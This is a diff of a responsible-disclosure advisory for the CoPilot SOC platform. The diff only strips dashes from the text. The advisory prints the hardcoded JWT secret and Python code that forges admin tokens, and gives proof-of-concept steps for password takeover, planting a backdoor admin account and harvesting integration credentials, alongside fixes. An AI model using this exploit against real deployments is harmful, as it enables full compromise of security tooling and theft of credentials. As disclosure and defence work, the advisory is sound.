@@ -3,19 +3,19 @@
 
 
 
-# CVE-PENDING — CoPilot: Unauthenticated Full Admin Compromise via Hardcoded JWT Secret
+# CVE-PENDING CoPilot: Unauthenticated Full Admin Compromise via Hardcoded JWT Secret
 
 > **Disclosure type:** Responsible disclosure  
 > **Severity:** Critical (CVSS 3.1: 10.0)  
-> **Status:** Unpatched — reported to maintainers  
-> **Affected software:** [CoPilot](https://github.com/socfortress/CoPilot) — SOC platform by SOCFortress  
+> **Status:** Unpatched reported to maintainers  
+> **Affected software:** [CoPilot](https://github.com/socfortress/CoPilot) SOC platform by SOCFortress  
 > **Affected versions:** All versions where `JWT_SECRET` is unset (including the default Docker Compose setup)
 
 ---
 
 ## Summary
 
-CoPilot ships a hardcoded JWT secret as a fallback value in `backend/app/auth/utils.py` and verbatim in `.env.example`. Any deployment where `JWT_SECRET` is not explicitly overridden — including the default Docker Compose setup — signs all authentication tokens with this publicly known value.
+CoPilot ships a hardcoded JWT secret as a fallback value in `backend/app/auth/utils.py` and verbatim in `.env.example`. Any deployment where `JWT_SECRET` is not explicitly overridden, including the default Docker Compose setup, signs all authentication tokens with this publicly known value.
 
 An unauthenticated attacker who knows this secret (it is indexed on GitHub) can forge arbitrary admin-scoped JWTs and gain full control of the application and every security tool it manages without any credentials.
 
@@ -58,7 +58,7 @@ Both conditions are trivially satisfied with the public secret and the always-pr
 
 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
 
-Scope is **Changed** because exploitation does not stop at CoPilot — it pivots directly into every integrated security tool (Wazuh, Graylog, DFIR-IRIS, Cortex, Velociraptor) via harvested connector credentials.
+Scope is **Changed** because exploitation does not stop at CoPilot it pivots directly into every integrated security tool (Wazuh, Graylog, DFIR-IRIS, Cortex, Velociraptor) via harvested connector credentials.
 
 ---
 
@@ -66,7 +66,7 @@ Scope is **Changed** because exploitation does not stop at CoPilot — it pivots
 
 All steps below were executed against a live default deployment. Each returned HTTP 200.
 
-### Step 1 — Forge admin JWT (no credentials required)
+### Step 1 Forge admin JWT (no credentials required)
 
 ```python
 import jwt, time
@@ -74,7 +74,7 @@ secret = "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc="
 token = jwt.encode({"sub": "admin", "scopes": ["admin"], "exp": int(time.time()) + 86400}, secret, algorithm="HS256")
 ```
 
-### Step 2 — Confirm authentication bypass
+### Step 2 Confirm authentication bypass
 
 ```
 python 01_jwt_forgery.py dump-users
@@ -86,7 +86,7 @@ python 01_jwt_forgery.py dump-users
       id=2  username=scheduler  email=scheduler@scheduler.com  role=scheduler
 ```
 
-### Step 3 — Take over the admin account (password reset, no current password required)
+### Step 3 Take over the admin account (password reset, no current password required)
 
 ```
 python 01_jwt_forgery.py reset-password
@@ -98,7 +98,7 @@ python 01_jwt_forgery.py reset-password
 
 `/api/auth/reset-password` accepts a forged token with no secondary verification — no current password, no email confirmation, no MFA. This is a **second independent finding** (see Finding 02 below).
 
-### Step 4 — Plant persistent backdoor admin account
+### Step 4 Plant persistent backdoor admin account
 
 ```
 python 01_jwt_forgery.py add-admin
@@ -106,13 +106,13 @@ python 01_jwt_forgery.py add-admin
 
 The backdoor account is stored in the database and survives JWT secret rotation. After rotation, the attacker re-authenticates legitimately via `/api/auth/token` using the planted credentials.
 
-### Step 5 — Harvest connector credentials
+### Step 5 Harvest connector credentials
 
 ```
 python 01_jwt_forgery.py dump-connectors
 ```
 
-CoPilot stores credentials for all integrated tools in plaintext in the database. These are returned directly by `/api/connectors` with an admin-scoped token. Affected integrations include Wazuh, Graylog, DFIR-IRIS, Cortex, and Velociraptor — each of which typically holds admin-level access to the tools it manages.
+CoPilot stores credentials for all integrated tools in plaintext in the database. These are returned directly by `/api/connectors` with an admin-scoped token. Affected integrations include Wazuh, Graylog, DFIR-IRIS, Cortex, and Velociraptor each of which typically holds admin-level access to the tools it manages.
 
 ---
 
@@ -128,7 +128,7 @@ Executes all steps sequentially: auth bypass confirmation → credential harvest
 
 ## Findings
 
-### Finding 01 — Hardcoded JWT secret (this issue)
+### Finding 01 Hardcoded JWT secret (this issue)
 
 **Location:** `backend/app/auth/utils.py:28`  
 **Impact:** Complete authentication bypass. Forge arbitrary admin tokens with no credentials.  
@@ -143,17 +143,17 @@ assert len(secret) >= 32, "JWT_SECRET too short"
 assert secret != "bL4unrkoxtFs1MT6A7Ns2yMLkduyuqrkTxDV9CjlbNc=", "JWT_SECRET is the insecure default"
 ```
 
-### Finding 02 — No secondary verification on password reset
+### Finding 02 No secondary verification on password reset
 
 **Location:** `/api/auth/reset-password`  
 **Impact:** Any valid admin-scoped token can reset any user's password with no ownership check. Confirmed HTTP 200 against the admin account from a forged token.  
 **Remediation:** Require `current_password` for self-resets. Restrict cross-user resets to admin role with audit logging.
 
-### Finding 03 — Connector credentials stored and returned in plaintext
+### Finding 03 Connector credentials stored and returned in plaintext
 
 **Location:** `/api/connectors` response body  
 **Impact:** All integration credentials (Wazuh, DFIR-IRIS, Cortex, Velociraptor, Graylog) are readable via the API with an admin token. Combined with Finding 01, this means every tool in the SOC stack is compromised in a single request.  
-**Remediation:** Encrypt credentials at rest. Never return secrets in API responses — return a masked indicator instead.
+**Remediation:** Encrypt credentials at rest. Never return secrets in API responses return a masked indicator instead.
 
 ---
 
@@ -165,7 +165,7 @@ Because CoPilot manages Wazuh alerting pipelines, an attacker with admin access 
 - Modify or delete active alerts retroactively
 - Abuse the `scheduler` user (also exposed) to run attacker-controlled background jobs
 
-**The compromise is self-concealing** — the tool you would use to detect the intrusion is under attacker control.
+**The compromise is self-concealing** the tool you would use to detect the intrusion is under attacker control.
 
 Even after the JWT secret is rotated:
 - Previously issued forged tokens remain valid until their `exp` claim
@@ -205,7 +205,7 @@ This research was conducted against a locally controlled deployment. The PoC inc
 
 | File | Description |
 |---|---|
-| `01_jwt_forgery.py` | Full PoC — forge, dump-users, dump-connectors, add-admin, reset-password, promote, chain |
+| `01_jwt_forgery.py` | Full PoC forge, dump-users, dump-connectors, add-admin, reset-password, promote, chain |
 | `README.md` | This document |
 
 ---
